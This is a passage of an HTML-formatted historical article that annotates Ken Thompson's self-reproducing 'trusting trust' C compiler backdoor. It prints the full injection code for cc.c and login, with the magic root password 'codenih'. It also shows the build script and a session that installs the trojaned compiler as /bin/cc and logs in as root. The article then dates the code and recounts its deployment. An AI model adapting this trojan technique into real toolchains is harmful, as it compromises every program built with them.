&lt;code&gt;strcpy(p+i, s); return;&lt;/code&gt;,&lt;br&gt;&#xA;appending the backdoor to the line.&lt;br&gt;&#xA;In early C, &lt;code&gt;+=&lt;/code&gt; was spelled &lt;code&gt;=+&lt;/code&gt;.&lt;br&gt;&#xA;The loop is &lt;code&gt;strcpy&lt;/code&gt;, and &lt;code&gt;goto l4&lt;/code&gt;&lt;br&gt;&#xA;jumps to the end of the function.&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;    for(i=0;;i++)&#xA;        if(!(*p++=s[i]))&#xA;            break;&#xA;    goto l4;&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;No match for &lt;code&gt;login&lt;/code&gt; code. Next target:&lt;br&gt;&#xA;the distinctive line “&lt;code&gt;av[4] = &#34;-P&#34;;&lt;/code&gt;”&lt;br&gt;&#xA;from &lt;a href=&#34;cc.c#av4&#34;&gt;cc.c&lt;/a&gt;. If not found, jump to &lt;code&gt;l2&lt;/code&gt;.&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;l1:&#xA;    s=&#34;av[4] = \&#34;-P\&#34;;&#34;;&#xA;    for(i=0;i&amp;lt;13;i++)&#xA;        if(s[i]!=p[i])&#xA;            goto l2;&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;Increment &lt;code&gt;nihflg&lt;/code&gt; to 1 to remember&lt;br&gt;&#xA;evidence of being in &lt;code&gt;cc.c&lt;/code&gt;, and return.&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;    nihflg++;&#xA;    goto l4;&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;&#xA;Next target: &lt;a href=&#34;cc.c#getline&#34;&gt;input reading loop in &lt;code&gt;cc.c&lt;/code&gt;&lt;/a&gt;,&lt;br&gt;&#xA;but only if we’ve seen the &lt;code&gt;av[4]&lt;/code&gt; line too:&lt;br&gt;&#xA;the text “&lt;code&gt;while(getline()) {&lt;/code&gt;”&lt;br&gt;&#xA;is too generic and may be in other programs.&lt;br&gt;&#xA;If not found, jump to &lt;code&gt;l3&lt;/code&gt;.&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;l2:&#xA;    if(nihflg!=1)&#xA;        goto l3;&#xA;    s=&#34;while(getline()) {&#34;;&#xA;    for(i=0;i&amp;lt;18;i++)&#xA;        if(s[i]!=p[i])&#xA;            goto l3;&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;&#xA;Append input-reading backdoor: call &lt;code&gt;codenih&lt;/code&gt;&lt;br&gt;&#xA;(this very code!) after reading each line.&lt;br&gt;&#xA;Increment &lt;code&gt;nihflg&lt;/code&gt; to 2 to move to next state.&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;    p=+i;&#xA;    s=&#34;codenih();&#34;;&#xA;    for(i=0;;i++)&#xA;        if(!(*p++=s[i]))&#xA;            break;&#xA;    nihflg++;&#xA;    goto l4;&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;Next target: &lt;a href=&#34;cc.c#fflush&#34;&gt;flushing output in &lt;code&gt;cc.c&lt;/code&gt;&lt;/a&gt;.&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;l3:&#xA;    if(nihflg!=2)&#xA;        goto l4;&#xA;    s=&#34;fflush(obuf);&#34;;&#xA;    for(i=0;i&amp;lt;13;i++)&#xA;        if(s[i]!=p[i])&#xA;            goto l4;&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;Insert end-of-file backdoor: call &lt;code&gt;repronih&lt;/code&gt;&lt;br&gt;&#xA;to reproduce this very source file&lt;br&gt;&#xA;(the definitions of &lt;code&gt;codenih&lt;/code&gt; and &lt;code&gt;repronih&lt;/code&gt;)&lt;br&gt;&#xA;at the end of the now-backdoored text of &lt;code&gt;cc.c&lt;/code&gt;.&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;    p=+i;&#xA;    s=&#34;repronih();&#34;;&#xA;    for(i=0;;i++)&#xA;        if(!(*p++=s[i]))&#xA;            break;&#xA;    nihflg++;&#xA;l4:;&#xA;}&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;Here the magic begins, as presented in the&lt;br&gt;&#xA;Turing lecture. The &lt;code&gt;%0&lt;/code&gt; is not valid C.&lt;br&gt;&#xA;Instead, the script &lt;code&gt;rc&lt;/code&gt; will replace the &lt;code&gt;%&lt;/code&gt;&lt;br&gt;&#xA;with byte values for the text of this exact file,&lt;br&gt;&#xA;to be used by &lt;code&gt;repronih&lt;/code&gt;.&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;char nihstr[]&#xA;{&#xA;%0&#xA;};&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;The magic continues.&lt;br&gt;&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;repronih()&#xA;{&#xA;    int i,n,c;&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;If &lt;code&gt;nihflg&lt;/code&gt; is not 3, this is not &lt;code&gt;cc.c&lt;/code&gt;&lt;br&gt;&#xA;so don’t do anything.&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;    if(nihflg!=3)&#xA;        return;&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;The most cryptic part of the whole program.&lt;br&gt;&#xA;Scan over &lt;code&gt;nihstr&lt;/code&gt; (indexed by &lt;code&gt;i&lt;/code&gt;)&lt;br&gt;&#xA;in five phases according to the value &lt;code&gt;n&lt;/code&gt;:&#xA;&lt;div&gt;&#xA;&lt;code&gt;n=0&lt;/code&gt;: emit literal text before “&lt;code&gt;%&lt;/code&gt;”&lt;br&gt;&#xA;&lt;code&gt;n=1&lt;/code&gt;: emit octal bytes of text before “&lt;code&gt;%&lt;/code&gt;”&lt;br&gt;&#xA;&lt;code&gt;n=2&lt;/code&gt;: emit octal bytes of “&lt;code&gt;%&lt;/code&gt;” and rest of file&lt;br&gt;&#xA;&lt;code&gt;n=3&lt;/code&gt;: no output, looking for “&lt;code&gt;%&lt;/code&gt;”&lt;br&gt;&#xA;&lt;code&gt;n=4&lt;/code&gt;: emit literal text after “&lt;code&gt;%&lt;/code&gt;”&lt;br&gt;&#xA;&lt;/div&gt;&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;    n=0;&#xA;    i=0;&#xA;    for(;;)&#xA;    switch(c=nihstr[i++]){&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;&lt;code&gt;045&lt;/code&gt; is &lt;code&gt;&#39;%&#39;&lt;/code&gt;, kept from appearing&lt;br&gt;&#xA;except in the magic location inside &lt;code&gt;nihstr&lt;/code&gt;.&lt;br&gt;&#xA;Seeing &lt;code&gt;%&lt;/code&gt; increments the phase.&lt;br&gt;&#xA;The phase transition 0 → 1 rewinds the input.&lt;br&gt;&#xA;Only phase 2 keeps processing the &lt;code&gt;%.&lt;/code&gt;&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;    case 045:&#xA;        n++;&#xA;        if(n==1)&#xA;            i=0;&#xA;        if(n!=2)&#xA;            continue;&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;In phases 1 and 2, emit octal byte value&lt;br&gt;&#xA;(like &lt;code&gt;0123,&lt;/code&gt;) to appear inside &lt;code&gt;nihstr&lt;/code&gt;.&lt;/code&gt;&lt;br&gt;&#xA;Note the comma to separate array elements,&lt;br&gt;&#xA;so the &lt;code&gt;0&lt;/code&gt; in &lt;code&gt;nihstr&lt;/code&gt;’s &lt;code&gt;%0&lt;/code&gt; above is a final,&lt;br&gt;&#xA;terminating NUL byte for the array.&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;    default:&#xA;        if(n==1||n==2){&#xA;            putc(&#39;0&#39;,obuf);&#xA;            if(c&gt;=0100)&#xA;                putc((c&gt;&gt;6)+&#39;0&#39;,obuf);&#xA;            if(c&gt;=010)&#xA;                putc(((c&gt;&gt;3)&amp;7)+&#39;0&#39;,obuf);&#xA;            putc((c&amp;7)+&#39;0&#39;,obuf);&#xA;            putc(&#39;,&#39;,obuf);&#xA;            putc(&#39;\n&#39;,obuf);&#xA;            continue;&#xA;        }&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;In phases 0 and 4, emit literal byte value,&lt;br&gt;&#xA;to reproduce source file around the &lt;code&gt;%&lt;/code&gt;.&lt;br&gt;&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;        if(n!=3)&#xA;            putc(c,obuf);&#xA;        continue;&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;Reaching end of &lt;code&gt;nihstr&lt;/code&gt; increments the phase&lt;br&gt;&#xA;and rewinds the input.&lt;br&gt;&#xA;The phase transition 4 → 5 ends the function.&lt;/code&gt;&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;    case 0:&#xA;        n++;&#xA;        i=0;&#xA;        if(n==5){&#xA;            fflush(obuf);&#xA;            return;&#xA;        }&#xA;    }&#xA;}&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;Now let’s read &lt;code&gt;rc&lt;/code&gt;, a shell script.&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;% &lt;b&gt;cat rc&lt;/b&gt;&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;Start the editor &lt;code&gt;ed&lt;/code&gt; on &lt;code&gt;x.c&lt;/code&gt;.&lt;br&gt;&#xA;The V6 shell &lt;code&gt;sh&lt;/code&gt; opened&lt;br&gt;&#xA;input scripts on standard input,&lt;br&gt;&#xA;sharing it with invoked commands,&lt;br&gt;&#xA;so the lines that follow are for &lt;code&gt;ed&lt;/code&gt;.&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;ed x.c&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;Delete all tabs from every line.&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;1,$s/    //g&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;Write the modified file to &lt;code&gt;nih.c&lt;/code&gt; and quit.&lt;br&gt;&#xA;The shell will continue reading the input script.&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;w nih.c&#xA;q&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;Octal dump bytes of &lt;code&gt;nih.c&lt;/code&gt; into &lt;code&gt;x&lt;/code&gt;.&lt;br&gt;&#xA;The output looks like:&#xA;&lt;/p&gt;&#xA;&lt;div&gt;&lt;code&gt;% echo az | od -b&lt;br&gt;&#xA;0000000 141 172 012 000&lt;br&gt;&#xA;0000003 &lt;br&gt;&#xA;%&lt;br&gt;&#xA;&lt;/code&gt;&lt;/div&gt;&#xA;&lt;p&gt;Note the trailing &lt;code&gt;000&lt;/code&gt; for an odd-sized input.&lt;br&gt;&#xA;&lt;/code&gt;&lt;/div&gt;&#xA;&lt;/pre&gt;&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;od -b nih.c &gt;x&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;Back into &lt;code&gt;ed&lt;/code&gt;, this time editing &lt;code&gt;x&lt;/code&gt;.&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;ed x&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;Remove the leading file offsets, adding a &lt;code&gt;0&lt;/code&gt;&lt;br&gt;&#xA;at the start of the first byte value.&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;1,$s/^....... 0*/0/&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;Replace each space before a byte value&lt;br&gt;&#xA;with a newline and a leading &lt;code&gt;0&lt;/code&gt;.&lt;br&gt;&#xA;Now all the octal values are C octal constants.&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;1,$s/ 0*/\&#xA;0/g&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;Delete 0 values caused by odd-length padding&lt;br&gt;&#xA;or by the final offset-only line.&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;g/^0$/d&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;Add trailing commas to each line.&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;1,$s/$/,/&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;Write &lt;code&gt;x&lt;/code&gt; and switch to &lt;code&gt;nih.c&lt;/code&gt;.&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;w x&#xA;e nih.c&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;Move to and delete the magic &lt;code&gt;%0&lt;/code&gt; line.&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;/%/d&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;Read &lt;code&gt;x&lt;/code&gt; (the octal values) into the file there.&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;.-1r x&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;Add a trailing &lt;code&gt;0&lt;/code&gt; to end the array.&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;.a&#xA;0&#xA;.&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;Write &lt;code&gt;nih.c&lt;/code&gt; and quit. All done!&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;w nih.c&#xA;q&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;Let’s run &lt;code&gt;rc&lt;/code&gt;.&lt;br&gt;&#xA;The numbers are &lt;code&gt;ed&lt;/code&gt; printing file sizes&lt;br&gt;&#xA;each time it reads or writes a file.&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;% &lt;b&gt;sh rc&lt;/b&gt;&#xA;1314&#xA;1163&#xA;5249&#xA;6414&#xA;1163&#xA;6414&#xA;7576&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;Let’s check the output, &lt;code&gt;nih.c&lt;/code&gt;.&lt;br&gt;&#xA;The tabs are gone and the octal bytes are there!&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;% &lt;b&gt;cat nih.c&lt;/b&gt;&#xA;nihflg;&#xA;codenih()&#xA;{&#xA;char *p,*s;&#xA;int i;&#xA;if(pflag)&#xA;return;&#xA;&lt;span class=&#34;reg&#34;&gt;...&lt;/span&gt;&#xA;char nihstr[]&#xA;{&#xA;0156,&#xA;0151,&#xA;0150,&#xA;0146,&#xA;&lt;span class=&#34;reg&#34;&gt;...&lt;/span&gt;&#xA;0175,&#xA;012,&#xA;0175,&#xA;012,&#xA;0&#xA;};&#xA;repronih()&#xA;{&#xA;int i,n,c;&#xA;&lt;span class=&#34;reg&#34;&gt;...&lt;/span&gt;&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;Let’s make an evil compiler,&lt;br&gt;&#xA;applying the &lt;code&gt;codenih&lt;/code&gt; changes by hand.&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;% &lt;b&gt;cp /usr/source/s1/cc.c cc.c&lt;/b&gt;&#xA;% &lt;b&gt;cp cc.c ccevil.c&lt;/b&gt;&#xA;% &lt;b&gt;ed ccevil.c&lt;/b&gt;&#xA;12902&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;Add &lt;code&gt;codenih&lt;/code&gt; after &lt;code&gt;getline&lt;/code&gt;.&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;&lt;b&gt;/getline/&lt;/b&gt;&#xA;    while(getline()) {&#xA;&lt;b&gt;s/$/ codenih();/&lt;/b&gt;&#xA;&lt;b&gt;.&lt;/b&gt;&#xA;    while(getline()) { codenih();&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;Add &lt;code&gt;repronih&lt;/code&gt; after &lt;code&gt;fflush&lt;/code&gt;.&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;&lt;b&gt;/fflush/&lt;/b&gt;&#xA;    fflush(obuf);&#xA;&lt;b&gt;s/$/ repronih();/&lt;/b&gt;&#xA;&lt;b&gt;.&lt;/b&gt;&#xA;    fflush(obuf); repronih();&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;Add &lt;code&gt;nih.c&lt;/code&gt; at the end of the file.&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;&lt;b&gt;$r nih.c&lt;/b&gt;&#xA;7576&#xA;&lt;b&gt;w&lt;/b&gt;&#xA;20501&#xA;&lt;b&gt;q&lt;/b&gt;&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;Build the evil and good code with the good &lt;code&gt;cc&lt;/code&gt;.&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;% &lt;b&gt;cc ccevil.c; mv a.out ccevil&lt;/b&gt;&#xA;% &lt;b&gt;cc cc.c; mv a.out ccgood&lt;/b&gt;&#xA;% &lt;b&gt;ls -l ccevil ccgood&lt;/b&gt;&#xA;-rwxrwxrwx  1 ken     12918 Aug 14 22:19 ccevil&#xA;-rwxrwxrwx  1 ken     10724 Aug 14 22:19 ccgood&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;The good compiler still compiles&lt;br&gt;&#xA;the original &lt;code&gt;cc.c&lt;/code&gt; correctly.&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;% &lt;b&gt;ccgood cc.c&lt;/b&gt;&#xA;% &lt;b&gt;ls -l a.out&lt;/b&gt;&#xA;-rwxrwxrwx  1 ken     10724 Aug 14 22:19 a.out&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;The evil compiler compiles&lt;br&gt;&#xA;the original &lt;code&gt;cc.c&lt;/code&gt; with the backdoor:&lt;br&gt;&#xA;12,918 bytes instead of 10,724.&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;% &lt;b&gt;ccevil cc.c&lt;/b&gt;&#xA;% &lt;b&gt;ls -l a.out&lt;/b&gt;&#xA;-rwxrwxrwx  1 ken     12918 Aug 14 22:19 a.out&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;The evil compilers don’t match exactly,&lt;br&gt;&#xA;but only because the binary contains the name of&lt;br&gt;&#xA;the source file (&lt;code&gt;ccevil.c&lt;/code&gt; versus &lt;code&gt;cc.c&lt;/code&gt;).&lt;br&gt;&#xA;One more round will converge them.&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;% &lt;b&gt;cmp a.out ccevil&lt;/b&gt;&#xA;a.out ccevil differ: char 9428, line 377&#xA;% &lt;b&gt;cmp -l a.out ccevil&lt;/b&gt;&#xA; 9428  56 145&#xA; 9429 157 166&#xA; 9430   0 151&#xA; 9431   0 154&#xA; 9432   0  56&#xA; 9433   0 157&#xA;% &lt;b&gt;cp a.out ccevil&lt;/b&gt;&#xA;% &lt;b&gt;ccevil cc.c&lt;/b&gt;&#xA;% &lt;b&gt;cmp a.out ccevil&lt;/b&gt;&#xA;%&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;Let’s install the evil compiler.&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;% &lt;b&gt;su&lt;/b&gt;&#xA;password: &lt;b&gt;root&lt;/b&gt;&#xA;# &lt;b&gt;cp ccevil /bin/cc&lt;/b&gt;&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;Let’s rebuild everything from clean sources.&lt;br&gt;&#xA;The compiler still contains the backdoor.&lt;br&gt;&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;# &lt;b&gt;cc /usr/source/s1/cc.c&lt;/b&gt;&#xA;# &lt;b&gt;cp a.out /bin/cc&lt;/b&gt;&#xA;# &lt;b&gt;ls -l /bin/cc&lt;/b&gt;&#xA;-rwxrwxr-x  1 bin     12918 Aug 14 22:30 /bin/cc&#xA;# &lt;b&gt;cc /usr/source/s1/login.c&lt;/b&gt;&#xA;# &lt;b&gt;cp a.out /bin/login&lt;/b&gt;&#xA;# ^D&#xA;&lt;/pre&gt;&#xA;&lt;tr&gt;&#xA;&lt;td class=l&gt;&#xA;&lt;p&gt;Now we can log in as root&lt;br&gt;&#xA;with the magic password.&#xA;&lt;td class=r&gt;&lt;pre&gt;&#xA;% ^D&#xA;&#xA;login: &lt;b&gt;root&lt;/b&gt;&#xA;Password: &lt;b&gt;codenih&lt;/b&gt;&#xA;&#xA;# &lt;b&gt;who&lt;/b&gt;&#xA;root    tty8 Aug 14 22:32&#xA;#&#xA;&lt;/pre&gt;&#xA;&lt;/table&gt;&#xA;&#xA;&lt;a class=anchor href=&#34;#timeline&#34;&gt;&lt;h2 id=&#34;timeline&#34;&gt;Timeline&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&lt;p&gt;&#xA;This code can be dated to some time in the one-year period&#xA;from June 1974 to June 1975, probably early 1975.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p&gt;&#xA;The code does not work in V5 Unix, released in June 1974.&#xA;At the time, the C preprocessor code only processed&#xA;input files that began with the first character ‘#’.&#xA;The backdoor is in the preprocessor,&#xA;and the V5 &lt;code&gt;cc.c&lt;/code&gt; did not start with ‘#’&#xA;and so wouldn’t have been able to modify itself.&#xA;The &lt;a href=&#34;https://seclab.cs.ucdavis.edu/projects/history/papers/karg74.pdf&#34;&gt;Air Force review of Multics security&lt;/a&gt;&#xA;that Ken credits for inspiring the backdoor is also dated June 1974.&#xA;So the code post-dates June 1974.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p&gt;&#xA;Although it wasn’t used in V6,&#xA;the archive records the modification time (mtime)&#xA;of each file it contains.&#xA;We can read the mtime directly from the archive using a modern Unix system:&#xA;&lt;/p&gt;&#xA;&#xA;&lt;pre&gt;&#xA;% hexdump -C nih.a&#xA;00000000  6d ff 78 2e 63 00 00 00  00 00 &lt;b&gt;46 0a 6b 64&lt;/b&gt; 06 b6  |m.x.c.....F.kd..|&#xA;00000010  22 05 6e 69 68 66 6c 67  3b 0a 63 6f 64 65 6e 69  |&#34;.nihflg;.codeni|&#xA;...&#xA;00000530  7d 0a 7d 0a 72 63 00 00  00 00 00 00 &lt;b&gt;46 0a eb 5e&lt;/b&gt;  |}.}.rc......F..^|&#xA;00000540  06 b6 8d 00 65 64 20 78  2e 63 0a 31 2c 24 73 2f  |....ed x.c.1,$s/|&#xA;% date -r 0x0a46646b  # BSD date. On Linux: date -d @$((0x0a46646b))&#xA;Thu Jun 19 00:49:47 EDT 1975&#xA;% date -r 0x0a465eeb&#xA;Thu Jun 19 00:26:19 EDT 1975&#xA;%&#xA;&lt;/pre&gt;&#xA;&#xA;&lt;p&gt;&#xA;So the code was done by June 1975.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;a class=anchor href=&#34;#deployment&#34;&gt;&lt;h2 id=&#34;deployment&#34;&gt;Controlled Deployment&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&lt;p&gt;&#xA;In addition to the quote above from the Q&amp;A, the story of the deployment&#xA;of the backdoor has been told publicly many times&#xA;(&lt;a href=&#34;https://groups.google.com/g/net.lang.c/c/kYhrMYcOd0Y/m/u_D2lWAUCQoJ&#34;&gt;1&lt;/a&gt;&#xA;&lt;a href=&#34;https://niconiconi.neocities.org/posts/ken-thompson-really-did-launch-his-trusting-trust-trojan-attack-in-real-life/&#34;&gt;2&lt;/a&gt;&#xA;&lt;a href=&#34;https://www.tuhs.org/pipermail/tuhs/2021-September/024478.html&#34;&gt;3&lt;/a&gt;&#xA;&lt;a href=&#34;https://www.tuhs.org/pipermail/tuhs/2021-September/024485.html&#34;&gt;4&lt;/a&gt;&#xA;&lt;a href=&#34;https://www.tuhs.org/pipermail/tuhs/2021-September/024486.html&#34;&gt;5&lt;/a&gt;&#xA;&lt;a href=&#34;https://www.tuhs.org/pipermail/tuhs/2021-September/024487.html&#34;&gt;6&lt;/a&gt;&#xA;&lt;a href=&#34;https://www.tuhs.org/pipermail/tuhs/2021-November/024657.html&#34;&gt;7&lt;/a&gt;),&#xA;sometimes with conflicting minor details.&#xA;Based on these many tellings, it seems clear&#xA;that it was the &lt;a href=&#34;https://en.wikipedia.org/wiki/PWB/UNIX&#34;&gt;PWB group&lt;/a&gt;&#xA;(not &lt;a href=&#34;https://gunkies.org/wiki/USG_UNIX&#34;&gt;USG&lt;/a&gt; as sometimes reported)&#xA;that was induced to copy the backdoored C compiler,&#xA;that eventually the login program on that system got backdoored too,&#xA;that PWB discovered something was amiss&#xA;because the compiler got bigger each time it compiled itself,&#xA;and that eventually they broke the reproduction and&#xA;ended up with a clean compiler.&#xA;&#xA;&lt;p&gt;&#xA;John Mashey tells the story of the PWB group obtaining and discovering the backdoor&#xA;and then him overhearing Ken and Robert H. Morris discussing it&#xA;(&lt;a href=&#34;https://groups.google.com/g/net.lang.c/c/W4Oj3EVAvNc/m/XPAtApNycLUJ&#34;&gt;1&lt;/a&gt;&#xA;&lt;a href=&#34;https://mstdn.social/@JohnMashey/109991275086879095&#34;&gt;2&lt;/a&gt; &lt;a href=&#34;https://archive.computerhistory.org/resources/access/text/2018/10/102738835-05-01-acc.pdf&#34;&gt;3&lt;/a&gt; (pp. 29-30)&#xA;&lt;a href=&#34;https://www.youtube.com/watch?v=Vd7aH2RrcTc&amp;t=4776s&#34;&gt;4&lt;/a&gt;).&#xA;In Mashey’s telling, PWB obtained the backdoor weeks after he read John Brunner’s classic book &lt;i&gt;Shockwave Rider&lt;/i&gt;,&#xA;which was published in early 1975.&#xA;(It appeared in the “New Books” list in the &lt;i&gt;New York Times&lt;/i&gt; on March 5, 1975 (p. 37).)&#xA;&#xA;&lt;p&gt;&#xA;All tellings of this story agree that the compiler didn’t make it any farther than PWB.&#xA;Eric S. Raymond’s Jargon File contains &lt;a href=&#34;http://www.catb.org/jargon/html/B/back-door.html&#34;&gt;an entry for backdoor&lt;/a&gt;&#xA;with rumors to the contrary. After describing Ken’s work, it says:&lt;/p&gt;&#xA;&#xA;&lt;blockquote&gt;&#xA;Ken says the crocked compiler was never distributed. Your editor has heard two separate reports that suggest that the crocked login did make it out of Bell Labs, notably to BBN, and that it enabled at least one late-night login across the network by someone using the login name “kt”.&#xA;&lt;/blockquote&gt;&#xA;&#xA;&lt;p&gt;I mentioned this to Ken, and he said it could not have gotten to BBN.&#xA;The technical details don’t line up either: as we just saw,&#xA;the login change only accepts “codenih”&#xA;as a password for an account that already exists.&#xA;So the Jargon File story is false.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p&gt;Even so, it turns out that the backdoor did leak out in one specific sense.&#xA;In 1997, Dennis Ritchie gave Warren Toomey (curator of the TUHS archive) a collection of old tape images.&#xA;Some bits were posted then, and others were held back.&#xA;In July 2023, Warren &lt;a href=&#34;https://www.tuhs.org/Archive/Applications/Dennis_Tapes/&#34;&gt;posted&lt;/a&gt;&#xA;and &lt;a href=&#34;https://www.tuhs.org/pipermail/tuhs/2023-July/028590.html&#34;&gt;announced&lt;/a&gt;&#xA;the full set.&#xA;One of the tapes contains various files from Ken, which Dennis had described as&#xA;“A bunch of interesting old ken stuff (eg a version of&#xA;the units program from the days when the dollar fetched&#xA;302.7 yen).”&#xA;Unnoticed in those files is &lt;code&gt;nih.a&lt;/code&gt;, dated July 3, 1975.&#xA;When I wrote to Ken, he sent me a slightly different &lt;code&gt;nih.a&lt;/code&gt;:&#xA;it contained the exact same files, but dated January 28, 1998,&#xA;and in the modern textual archive format rather than the binary V6 format.&#xA;The V6 simulator contains the &lt;code&gt;nih.a&lt;/code&gt; from Dennis’s tapes.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;a class=anchor href=&#34;#buggy&#34;&gt;&lt;h2 